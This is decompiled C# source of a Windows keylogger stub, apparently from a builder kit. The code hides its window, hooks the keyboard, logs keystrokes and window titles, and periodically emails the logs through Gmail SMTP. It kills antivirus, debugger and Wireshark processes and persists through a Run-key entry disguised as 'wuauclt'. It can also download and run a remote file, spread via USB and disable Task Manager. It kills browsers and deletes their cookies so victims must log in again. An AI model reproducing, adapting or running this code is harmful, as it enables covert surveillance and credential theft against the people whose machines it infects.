using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using My;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	[AccessedThroughProperty("Timer2")]
	private Timer _Timer2;

	[AccessedThroughProperty("Timer4")]
	private Timer _Timer4;

	[AccessedThroughProperty("TextBox2")]
	private TextBox _TextBox2;

	[AccessedThroughProperty("TextBox3")]
	private TextBox _TextBox3;

	private string gmailpwd;

	private string gmailusr;

	private string tmrinterval;

	private string exename;

	private string downloadenabled;

	private string downloadurl;

	private string errortitle;

	private string errormessage;

	private string anties;

	private string enablelink;

	private string startup;

	private string cb6;

	private string cb7;

	private string cb8;

	private string cb9;

	private const string Fitz = "-!_@Fitz-@_!";

	[AccessedThroughProperty("K")]
	private clannad _K;

	private string elsf;

	private string[] Settings;

	private string str1n;

	private string path;

	private IPHostEntry adresipnes;

	internal virtual TextBox TextBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = TextBox1_TextChanged;
			if (_TextBox1 != null)
			{
				((Control)_TextBox1).remove_TextChanged(eventHandler);
			}
			_TextBox1 = value;
			if (_TextBox1 != null)
			{
				((Control)_TextBox1).add_TextChanged(eventHandler);
			}
		}
	}

	internal virtual Timer Timer1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer2_Tick;
			if (_Timer2 != null)
			{
				_Timer2.remove_Tick(eventHandler);
			}
			_Timer2 = value;
			if (_Timer2 != null)
			{
				_Timer2.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer4
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer4_Tick;
			if (_Timer4 != null)
			{
				_Timer4.remove_Tick(eventHandler);
			}
			_Timer4 = value;
			if (_Timer4 != null)
			{
				_Timer4.add_Tick(eventHandler);
			}
		}
	}

	internal virtual TextBox TextBox2
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox2 = value;
		}
	}

	internal virtual TextBox TextBox3
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox3 = value;
		}
	}

	private virtual clannad K
	{
		[DebuggerNonUserCode]
		get
		{
			return _K;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			clannad.DownEventHandler value2 = K_Down;
			if (_K != null)
			{
				clannad.Down -= value2;
			}
			_K = value;
			if (_K != null)
			{
				clannad.Down += value2;
			}
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		K = new clannad();
		str1n = null;
		path = Path.GetTempPath();
		adresipnes = Dns.GetHostByName(Dns.GetHostName());
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0038: Expected O, but got Unknown
		//IL_003f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0049: Expected O, but got Unknown
		//IL_004a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0054: Expected O, but got Unknown
		//IL_0055: Unknown result type (might be due to invalid IL or missing references)
		//IL_005f: Expected O, but got Unknown
		components = new Container();
		TextBox1 = new TextBox();
		Timer1 = new Timer(components);
		Timer2 = new Timer(components);
		Timer4 = new Timer(components);
		TextBox2 = new TextBox();
		TextBox3 = new TextBox();
		((Control)this).SuspendLayout();
		TextBox textBox = TextBox1;
		Point location = new Point(0, 0);
		((Control)textBox).set_Location(location);
		((Control)TextBox1).set_Name("TextBox1");
		TextBox textBox2 = TextBox1;
		Size size = new Size(100, 20);
		((Control)textBox2).set_Size(size);
		((Control)TextBox1).set_TabIndex(0);
		TextBox textBox3 = TextBox2;
		location = new Point(104, 80);
		((Control)textBox3).set_Location(location);
		((Control)TextBox2).set_Name("TextBox2");
		TextBox textBox4 = TextBox2;
		size = new Size(100, 20);
		((Control)textBox4).set_Size(size);
		((Control)TextBox2).set_TabIndex(1);
		TextBox textBox5 = TextBox3;
		location = new Point(104, 107);
		((Control)textBox5).set_Location(location);
		((Control)TextBox3).set_Name("TextBox3");
		TextBox textBox6 = TextBox3;
		size = new Size(100, 20);
		((Control)textBox6).set_Size(size);
		((Control)TextBox3).set_TabIndex(2);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(10, 10);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)TextBox3);
		((Control)this).get_Controls().Add((Control)(object)TextBox2);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextA(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

	private void TextBox1_TextChanged(object sender, EventArgs e)
	{
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_0183: Unknown result type (might be due to invalid IL or missing references)
		new F7h5o2wX4skMmN8HU();
		((Control)this).Hide();
		((Control)this).set_Visible(false);
		checked
		{
			try
			{
				FileSystem.FileOpen(1, Application.get_ExecutablePath(), (OpenMode)32, (OpenAccess)1, (OpenShare)(-1), -1);
				gmailusr = Strings.Space((int)FileSystem.LOF(1));
				gmailpwd = Strings.Space((int)FileSystem.LOF(1));
				tmrinterval = Strings.Space((int)FileSystem.LOF(1));
				exename = Strings.Space((int)FileSystem.LOF(1));
				downloadenabled = Strings.Space((int)FileSystem.LOF(1));
				downloadurl = Strings.Space((int)FileSystem.LOF(1));
				enablelink = Strings.Space((int)FileSystem.LOF(1));
				anties = Strings.Space((int)FileSystem.LOF(1));
				startup = Strings.Space((int)FileSystem.LOF(1));
				cb6 = Strings.Space((int)FileSystem.LOF(1));
				cb7 = Strings.Space((int)FileSystem.LOF(1));
				cb8 = Strings.Space((int)FileSystem.LOF(1));
				cb9 = Strings.Space((int)FileSystem.LOF(1));
				errortitle = Strings.Space((int)FileSystem.LOF(1));
				errormessage = Strings.Space((int)FileSystem.LOF(1));
				Settings = Strings.Split(Encoding.Default.GetString(ResourceReader.ReadResource(Application.get_ExecutablePath())), "-!_@Fitz-@_!", -1, (CompareMethod)0);
				if (Operators.CompareString(Settings[13], "True", false) == 0)
				{
					MessageBox.Show(Settings[15], Settings[14], (MessageBoxButtons)0, (MessageBoxIcon)16);
				}
				if (Operators.CompareString(Settings[8], "True", false) == 0)
				{
					anserantiggenneko();
					antianekowtser();
					avarsernekochan();
					avergerneko();
					claromerchan();
					comderosama();
					edawrdelric();
					eftopstkun();
					macarfeechan();
					kaperskerneko();
					noremonkun();
					noretonekimblee();
					oofisescanalphonse();
					anteyolleydebegeeyuki();
					anteyoutpoestnagato();
					antaypeeceechilingharuhi();
					sandebocseenagisa();
					searvearproetektnyu();
					spieseweapalucard();
					wyresharkehavok();
					veeemchekmustang();
				}
				if (Operators.CompareString(Settings[9], "True", false) == 0)
				{
					adtoostertarpichigo("wuauclt", Application.get_ExecutablePath());
				}
				if (Operators.CompareString(Settings[5], "True", false) == 0)
				{
					((ServerComputer)MyProject.Computer).get_Network().DownloadFile(Settings[6], path + FileName(Settings[6]));
					Thread.Sleep(5000);
					Process.Start(path + FileName(Settings[6]));
				}
				if (Operators.CompareString(Settings[10], "True", false) == 0)
				{
					usb.Usb1();
				}
				if (Operators.CompareString(Settings[11], "True", false) == 0)
				{
					kielprocclust(InternetExplorer: true, Firefox: true);
					deeleeteeiecookeeshawkeye(Enable: true);
					deeleeteemosilercookeeshoenhiem(Enable: true);
				}
				if (Operators.CompareString(Settings[12], "True", false) == 0)
				{
					Timer4.Start();
				}
				TextBox1.set_Text(TextBox1.get_Text() + Conversions.ToString(DateAndTime.get_Now()));
				Timer1.Start();
				Timer2.set_Interval(Conversions.ToInteger(Settings[3]));
				Timer2.Start();
				K.CreateHook();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void K_Down(string Key)
	{
		TextBox1.set_Text(TextBox1.get_Text() + Key);
	}

	private void Timer4_Tick(object sender, EventArgs e)
	{
		if (Conversions.ToBoolean(Settings[12]))
		{
			((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", (object)"1", RegistryValueKind.DWord);
		}
	}

	public void kielprocclust(bool InternetExplorer, bool Firefox)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (Firefox)
			{
				if (process.MainWindowTitle.Contains("Mozilla Firefox"))
				{
					process.Kill();
				}
				else if (Operators.CompareString(process.ProcessName, "firefox.exe", false) == 0)
				{
					process.Kill();
				}
			}
			if (InternetExplorer)
			{
				if (process.MainWindowTitle.Contains("Internet Explorer"))
				{
					process.Kill();
				}
				else if (Operators.CompareString(process.ProcessName, "iexplore.exe", false) == 0)
				{
					process.Kill();
				}
			}
		}
	}

	public void deeleeteeiecookeeshawkeye(bool Enable)
	{
		if (!Enable)
		{
			return;
		}
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Cookies);
		if (!Directory.Exists(folderPath))
		{
			return;
		}
		foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(folderPath))
		{
			try
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(file);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public void deeleeteemosilercookeeshoenhiem(bool Enable)
	{
		if (!Enable)
		{
			return;
		}
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles";
		if (!Directory.Exists(text))
		{
			return;
		}
		foreach (string directory in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(text))
		{
			foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory))
			{
				if (file.Contains("cookie"))
				{
					try
					{
						((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(file);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
	}

	public void deeleeteemosilersineonesarmstrong(bool Enable)
	{
		if (!Enable)
		{
			return;
		}
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles";
		if (!Directory.Exists(text))
		{
			return;
		}
		foreach (string directory in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(text))
		{
			foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory))
			{
				if (file.Contains("signon"))
				{
					try
					{
						((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(file);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
	}

	public void antianekowtser()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "a2servic.exe", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public void anserantiggenneko()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "antigen.exe", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public void avarsernekochan()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "ashWebSv.exe", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public void adtoostertarpichigo(string Name, string Path)
	{
		try
		{
			RegistryKey currentUser = Registry.CurrentUser;
			RegistryKey registryKey = currentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue(Name, Path, RegistryValueKind.String);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void deeleteeetoostertarpichigo()
	{
		try
		{
			RegistryKey currentUser = Registry.CurrentUser;
			RegistryKey registryKey = currentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.DeleteValue("APPLICATIONTITLE", throwOnMissingValue: false);
			registryKey.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void avergerneko()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "avgemc.exe", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public void kaperskerneko()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "avp", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public void claromerchan()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "clamauto.exe", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public void comderosama()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "cpf.exe", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public void edawrdelric()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "ewido.exe", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public void eftopstkun()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "FPAVServer.exe", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public void macarfeechan()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "mcagentmcuimgr", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public void noremonkun()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "npfmsg", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public void noretonekimblee()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "ccapp.exe", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public void oofisescanalphonse()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "tmlisten.exe", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public void anteyolleydebegeeyuki()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "ollydbg", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public void anteyoutpoestnagato()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "outpost", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public void antaypeeceechilingharuhi()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "pccntmon.exe", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public void sandebocseenagisa()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0008;
				case 98:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_001c;
						case 5:
							goto IL_0026;
						case 6:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 4:
						case 7:
						case 8:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0026:
					num = 5;
					break;
					IL_001c:
					num = 3;
					((Form)this).Close();
					goto end_IL_0000_3;
					IL_0008:
					num = 2;
					if (((Form)this).get_Text().Contains("#"))
					{
						goto IL_001c;
					}
					goto IL_0026;
					end_IL_0000_2:
					break;
				}
				num = 6;
				((Control)this).Show();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 98;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public void searvearproetektnyu()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "earthagent.exe", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public void spieseweapalucard()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "spysweeper.exe", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public bool veeemchekmustang()
	{
		_ = Environment.UserName;
		string text = "SELECT * FROM Win32_VideoController";
		object[] array = new object[1] { text };
		bool[] array2 = new bool[1] { true };
		if (array2[0])
		{
			text = Conversions.ToString(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]))), typeof(string)));
		}
		bool result = default(bool);
		return result;
	}

	public void wyresharkehavok()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "wireshark", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	private string GetActiveWindowTitle()
	{
		string lpString = new string('\0', 100);
		GetWindowTextA(GetForegroundWindow(), ref lpString, 100);
		return lpString.Substring(0, checked(Strings.InStr(lpString, "\0", (CompareMethod)0) - 1));
	}

	private void Timer2_Tick(object sender, EventArgs e)
	{
		try
		{
			MailMessage mailMessage = new MailMessage();
			mailMessage.Subject = "[Dscreet Logs] - ";
			mailMessage.To.Add(Settings[1]);
			mailMessage.From = new MailAddress(Settings[1]);
			mailMessage.Body = TextBox1.get_Text();
			SmtpClient smtpClient = new SmtpClient("smtp.gmail.com");
			smtpClient.EnableSsl = true;
			smtpClient.Credentials = new NetworkCredential(Settings[1], Settings[2]);
			smtpClient.Port = 587;
			smtpClient.Send(mailMessage);
			((TextBoxBase)TextBox1).Clear();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public string FileName(string FullPath)
	{
		return Path.GetFileName(FullPath);
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		if (Operators.CompareString(str1n, GetActiveWindowTitle(), false) != 0)
		{
			TextBox1.set_Text(TextBox1.get_Text() + "\r\n[-- " + GetActiveWindowTitle() + " --]\r\n");
			str1n = GetActiveWindowTitle();
		}
	}
}
